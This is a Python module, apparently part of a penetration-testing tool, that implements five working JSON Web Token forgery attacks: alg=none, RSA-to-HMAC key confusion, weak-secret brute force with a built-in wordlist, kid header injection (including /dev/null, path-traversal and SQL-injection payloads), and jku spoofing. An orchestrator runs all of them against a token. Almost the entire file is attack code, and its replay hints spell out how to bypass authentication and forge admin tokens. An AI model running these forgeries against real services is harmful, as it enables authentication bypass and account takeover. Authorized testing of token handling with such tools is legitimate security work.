"""JWT attack primitives.

Five attack classes, each with a proven CVE-class track record:

  1. alg=none       — server accepts a header claiming no signature.
                      (CVE-2015-2951, CVE-2020-28042, countless.)

  2. RS↔HS confusion — server verifies HS256 with the RSA public key
                       as the HMAC secret. Client sends HS256-signed
                       tokens using the public key the server expects
                       to verify with.  (auth0/node-jsonwebtoken GHSA-
                       2z4x-97g5-x7w8, PyJWT CVE-2017-11424 family.)

  3. Weak HMAC brute — HS256 keys chosen from "secret", "password",
                       "jwt-key" — wordlist-crack in milliseconds.

  4. kid injection  — JWT header's `kid` field used as a filesystem
                      path or SQL fragment without sanitization.
                      Attacker points kid at `/dev/null` (HMAC of
                      empty → known) or SQLi-returns a chosen secret.

  5. jku spoofing   — header's `jku` URL fetched for verification
                      keys. Attacker supplies a URL they control.

Scope
-----
Pure in-memory token surgery; the functions never make HTTP calls.
Tests and the orchestrator are responsible for replaying the forged
tokens against the target.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("amoskys.argos.auth.jwt")


# ── Data model ────────────────────────────────────────────────────


@dataclass
class JWTFinding:
    technique: str  # "alg_none", "rs_hs_confusion", ...
    forged_token: str = ""
    severity: str = "high"
    evidence: str = ""
    replay_hint: str = ""  # suggested replay context for operator
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self):
        return {
            "technique": self.technique,
            "forged_token": self.forged_token,
            "severity": self.severity,
            "evidence": self.evidence,
            "replay_hint": self.replay_hint,
            "metadata": dict(self.metadata),
        }


@dataclass
class JWTReport:
    original_token: str
    decoded_header: Dict[str, Any] = field(default_factory=dict)
    decoded_payload: Dict[str, Any] = field(default_factory=dict)
    findings: List[JWTFinding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def to_dict(self):
        return {
            "original_token_prefix": (
                self.original_token[:32] + "..."
                if len(self.original_token) > 32
                else self.original_token
            ),
            "decoded_header": dict(self.decoded_header),
            "decoded_payload": dict(self.decoded_payload),
            "findings": [f.to_dict() for f in self.findings],
            "errors": list(self.errors),
        }


# ── Base64URL helpers ─────────────────────────────────────────────


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


# ── Unsafe decode ─────────────────────────────────────────────────


def decode_jwt_unsafe(token: str) -> Tuple[Dict[str, Any], Dict[str, Any], bytes]:
    """Split token → (header, payload, signature_bytes). No verification."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"malformed JWT (expected 3 parts, got {len(parts)})")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = _b64url_decode(parts[2]) if parts[2] else b""
    return header, payload, sig


def _assemble(header: Dict, payload: Dict, sig: bytes) -> str:
    h = _b64url_encode(
        json.dumps(header, separators=(",", ":"), sort_keys=True).encode()
    )
    p = _b64url_encode(
        json.dumps(payload, separators=(",", ":"), sort_keys=True).encode()
    )
    s = _b64url_encode(sig)
    return f"{h}.{p}.{s}"


# ── Attack 1: alg=none ────────────────────────────────────────────


def attack_alg_none(token: str) -> JWTFinding:
    """Produce token with `alg` set to "none" and an empty signature.

    Variants: "none", "None", "NONE", "nOnE" — some libraries
    lower-case before comparing, others don't. We pick "none" as the
    canonical forge and note the variants as replay hints.
    """
    try:
        header, payload, _ = decode_jwt_unsafe(token)
    except Exception as exc:
        return JWTFinding(
            technique="alg_none", severity="none", evidence=f"decode failed: {exc}"
        )
    h = dict(header)
    h["alg"] = "none"
    forged = _assemble(h, payload, b"")
    return JWTFinding(
        technique="alg_none",
        forged_token=forged,
        severity="critical",
        evidence="alg=none forgery. Replay this token; if server accepts, auth bypass.",
        replay_hint=(
            "Replay as Authorization: Bearer <token>. If rejected, retry with "
            "alg=None, alg=NONE, alg=nOnE variants — case-sensitive libraries bypass differently."
        ),
    )


# ── Attack 2: RS → HS key confusion ───────────────────────────────


def attack_key_confusion(token: str, rsa_public_key_pem: str) -> JWTFinding:
    """Forge HS256 token using the server's RSA public key as the
    HMAC secret. Server verifies with public key, matches our HMAC.
    """
    try:
        header, payload, _ = decode_jwt_unsafe(token)
    except Exception as exc:
        return JWTFinding(
            technique="rs_hs_confusion",
            severity="none",
            evidence=f"decode failed: {exc}",
        )

    h = dict(header)
    h["alg"] = "HS256"
    signing_input = (
        _b64url_encode(json.dumps(h, separators=(",", ":"), sort_keys=True).encode())
        + "."
        + _b64url_encode(
            json.dumps(payload, separators=(",", ":"), sort_keys=True).encode()
        )
    ).encode("ascii")
    sig = hmac.new(
        rsa_public_key_pem.encode("utf-8"), signing_input, hashlib.sha256
    ).digest()
    forged = signing_input.decode() + "." + _b64url_encode(sig)
    return JWTFinding(
        technique="rs_hs_confusion",
        forged_token=forged,
        severity="critical",
        evidence=(
            "HS256 HMAC computed with the server's RSA public key as the secret. "
            "Works if server code does not pin the alg (still uses alg from header)."
        ),
        replay_hint="Replay with Authorization: Bearer <token>. "
        "Success means library is vulnerable to CVE-2015-9235-class confusion.",
        metadata={"public_key_bytes": len(rsa_public_key_pem)},
    )


# ── Attack 3: weak HMAC secret brute ──────────────────────────────


_DEFAULT_WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "changeme",
    "jwt-key",
    "jwt_secret",
    "supersecret",
    "your-256-bit-secret",
    "my-secret-key",
    "default",
    "key",
    "token",
    "auth",
    "api-secret",
    "dev",
    "test",
    "qwerty",
    "letmein",
    "",
    "null",
    "none",
]


def attack_weak_secret(token: str, wordlist: Optional[List[str]] = None) -> JWTFinding:
    """Attempt to HMAC-verify token with a wordlist of common secrets."""
    try:
        header, payload, sig = decode_jwt_unsafe(token)
    except Exception as exc:
        return JWTFinding(
            technique="weak_secret_brute",
            severity="none",
            evidence=f"decode failed: {exc}",
        )
    alg = (header.get("alg") or "").upper()
    if alg not in ("HS256", "HS384", "HS512"):
        return JWTFinding(
            technique="weak_secret_brute",
            severity="info",
            evidence=f"alg={alg} is not HMAC — brute not applicable",
        )
    hashfn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }[alg]
    parts = token.strip().split(".")
    signing_input = (parts[0] + "." + parts[1]).encode("ascii")
    words = list(wordlist) if wordlist is not None else list(_DEFAULT_WEAK_SECRETS)
    for word in words:
        candidate_sig = hmac.new(word.encode("utf-8"), signing_input, hashfn).digest()
        if hmac.compare_digest(candidate_sig, sig):
            return JWTFinding(
                technique="weak_secret_brute",
                forged_token=token,
                severity="critical",
                evidence=f"HMAC secret recovered: '{word}'",
                replay_hint=(
                    f"Use secret '{word}' to sign any payload. You can now forge tokens "
                    "as any user. Change admin account sub claim and replay."
                ),
                metadata={"secret": word, "alg": alg, "tried": len(words)},
            )
    return JWTFinding(
        technique="weak_secret_brute",
        severity="info",
        evidence=f"tried {len(words)} common secrets against {alg}; none matched",
    )


# ── Attack 4: kid injection ───────────────────────────────────────


def attack_kid_injection(
    token: str, injection: str = "/dev/null", hmac_secret: str = ""
) -> JWTFinding:
    """Forge a token whose kid points at an attacker-controlled file/path.

    Classic payloads:
      kid=/dev/null       — file contents = "" → HMAC of empty is
                             computable → we sign with ""
      kid=../../../etc/passwd#   — path traversal
      kid=' UNION SELECT ...    — SQLi in kid lookup query

    We build the HMAC-empty forgery by default (`/dev/null` case).
    """
    try:
        header, payload, _ = decode_jwt_unsafe(token)
    except Exception as exc:
        return JWTFinding(
            technique="kid_injection", severity="none", evidence=f"decode failed: {exc}"
        )
    h = dict(header)
    h["kid"] = injection
    h["alg"] = h.get("alg") or "HS256"
    signing_input = (
        _b64url_encode(json.dumps(h, separators=(",", ":"), sort_keys=True).encode())
        + "."
        + _b64url_encode(
            json.dumps(payload, separators=(",", ":"), sort_keys=True).encode()
        )
    ).encode("ascii")
    secret = hmac_secret.encode("utf-8") if hmac_secret is not None else b""
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    forged = signing_input.decode() + "." + _b64url_encode(sig)
    return JWTFinding(
        technique="kid_injection",
        forged_token=forged,
        severity="high",
        evidence=f"kid={injection!r} injection; signed with HMAC secret={hmac_secret!r}",
        replay_hint=(
            "Replay. If server resolves kid as filesystem path and reads /dev/null "
            "(empty content) to use as HMAC key, the token verifies. "
            'Try /dev/null, ../../../etc/hostname, \'. UNION SELECT "secret" --.'
        ),
        metadata={"kid": injection, "secret_used": hmac_secret},
    )


# ── Attack 5: jku spoofing ────────────────────────────────────────


def attack_jku_spoofing(
    token: str, attacker_jku_url: str, attacker_jwk_kid: str = "attacker-key-1"
) -> JWTFinding:
    """Override the jku header to point at an attacker-controlled JWKS.

    The operator must host a JWKS at `attacker_jku_url` containing a
    public key whose private counterpart is in their possession.
    This function only produces the header; signing with the chosen
    private key is the operator's responsibility (we can't carry RSA
    libs here without adding dependencies).
    """
    try:
        header, payload, _ = decode_jwt_unsafe(token)
    except Exception as exc:
        return JWTFinding(
            technique="jku_spoofing", severity="none", evidence=f"decode failed: {exc}"
        )
    h = dict(header)
    h["jku"] = attacker_jku_url
    h["kid"] = attacker_jwk_kid
    # Placeholder unsigned — operator replaces signature after private-key signing.
    unsigned = (
        _b64url_encode(json.dumps(h, separators=(",", ":"), sort_keys=True).encode())
        + "."
        + _b64url_encode(
            json.dumps(payload, separators=(",", ":"), sort_keys=True).encode()
        )
        + "."
    )
    return JWTFinding(
        technique="jku_spoofing",
        forged_token=unsigned,
        severity="high",
        evidence=f"jku overridden to {attacker_jku_url}; kid={attacker_jwk_kid}",
        replay_hint=(
            "Host a JWKS at the jku URL containing a key you control; "
            "sign this unsigned prefix with its private counterpart; "
            "concatenate as part 3. Server will fetch your JWKS if it "
            "does not pin issuer-allowed jku domains."
        ),
        metadata={"jku": attacker_jku_url, "kid": attacker_jwk_kid},
    )


# ── Orchestrator ──────────────────────────────────────────────────


def scan_jwt(
    token: str,
    rsa_public_key_pem: Optional[str] = None,
    weak_secret_wordlist: Optional[List[str]] = None,
    attacker_jku_url: Optional[str] = None,
) -> JWTReport:
    """Run all applicable techniques against the provided token.

    Returns a JWTReport with findings list. The operator decides
    which forged tokens to replay.
    """
    report = JWTReport(original_token=token)
    try:
        h, p, _ = decode_jwt_unsafe(token)
        report.decoded_header = h
        report.decoded_payload = p
    except Exception as exc:
        report.errors.append(f"decode failed: {exc}")
        return report

    report.findings.append(attack_alg_none(token))
    if rsa_public_key_pem:
        report.findings.append(attack_key_confusion(token, rsa_public_key_pem))
    report.findings.append(attack_weak_secret(token, weak_secret_wordlist))
    report.findings.append(attack_kid_injection(token))
    if attacker_jku_url:
        report.findings.append(attack_jku_spoofing(token, attacker_jku_url))
    return report


__all__ = [
    "JWTFinding",
    "JWTReport",
    "decode_jwt_unsafe",
    "attack_alg_none",
    "attack_key_confusion",
    "attack_weak_secret",
    "attack_kid_injection",
    "attack_jku_spoofing",
    "scan_jwt",
]
